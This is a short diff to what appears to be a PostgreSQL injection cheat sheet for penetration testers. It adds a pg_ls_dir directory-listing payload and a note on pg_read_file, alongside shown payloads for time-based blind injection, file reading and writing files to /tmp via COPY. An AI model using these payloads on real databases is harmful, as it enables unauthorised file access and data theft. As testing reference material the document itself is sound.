@@ -26,8 +26,11 @@ AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 ## PostgreSQL File Read
 
 ```sql
+select pg_ls_dir('./');
 select pg_read_file('PG_VERSION', 0, 200);
 ```
+
+NOTE: ``pg_read_file` doesn't accept the `/` character.
 
 ```sql
 CREATE TABLE temp(t TEXT);
@@ -44,6 +47,6 @@ SELECT * FROM pentestlab;
 COPY pentestlab(t) TO '/tmp/pentestlab';
 ```
 
-## Thanks to
+## References
 
 * [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
